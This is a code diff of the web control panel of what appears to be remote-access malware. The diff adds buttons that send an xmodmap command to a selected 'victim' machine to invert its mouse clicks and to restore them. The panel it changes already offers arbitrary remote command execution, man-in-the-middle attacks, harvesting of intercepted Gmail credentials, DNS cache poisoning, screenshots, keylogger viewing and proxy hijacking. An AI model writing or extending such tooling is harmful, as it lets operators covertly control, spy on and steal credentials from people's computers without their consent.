@@ -48,6 +48,17 @@
 
   $(document).ready(function() {
 
+
+
+    $("#keypressinv").on('click', function() { 
+          socket.emit('send_client_cmd', { toclient: $("#victim").val(), cmd: 'xmodmap -e "pointer = 3 2 1"' }, function (data) {});   
+    });
+
+    $("#keypressok").on('click', function() { 
+          socket.emit('send_client_cmd', { toclient: $("#victim").val(), cmd: 'xmodmap -e "pointer = 1 2 3"' }, function (data) {});   
+    });
+
+
       $("#runcmd").on('click', function() { 
 
           socket.emit('send_client_cmd', { toclient: $("#victim").val(), cmd: $("#cmdinput").val() }, function (data) {
@@ -165,30 +176,40 @@
   </div>
 
   <div class="row">
+    <div class="col-sm-4" id="operations">
+        
       <h3>Remote Commands</h3>
-    <div class="col-sm-12" id="operations">
-        <input id="cmdinput" placeholder="Enter command"></input><button id="runcmd">Run</button> 
+        <input id="cmdinput" placeholder="Enter command"></input><br/><br/><button id="runcmd">Execute on remote computer</button> 
     </div>
-  </div>
 
-  <div class="row">
+    <div class="col-sm-8" id="operations">
+        
       <h3>Attacks</h3>
-    <div class="col-sm-12" id="operations">
         <button id="mitmdo">Man In the Middle Attack</button><br/><br/>  
         <button id="checkpass">MITM - Scan for intercepted Gmail Cred.</button><br/><br/>  
         <button id="poisondns">Poison DNS Cache</button> <br/> <br/> 
     </div>
+
+  </div>
+
+  <div class="row">
+    
   </div>
 
 
 <div class="row">
-      <h3>Misc.</h3>
     <div class="col-sm-4" id="operations">
+        
+      <h3>Telemetry.</h3>
         <button id="screen">Screenshot</button> <br/> <br/> 
         <button id="keylogger">View Keylogger Logs</button> <br/> <br/> 
+        
+        <button id="keypressinv">Invert Mouse clicks</button> <br/> <br/> 
+        <button id="keypressok">Default Mouse clicks</button> <br/> <br/> 
     </div>
     <div class="col-sm-8" id="operations">    
 
+      <h3>Configuration</h3>
         <input id="ffip" placeholder="IP address"></input>
         <input id="ffport" placeholder="Port"></input>
         <button id="proxychange">Change Proxy Settings</button> <br/> <br/> 
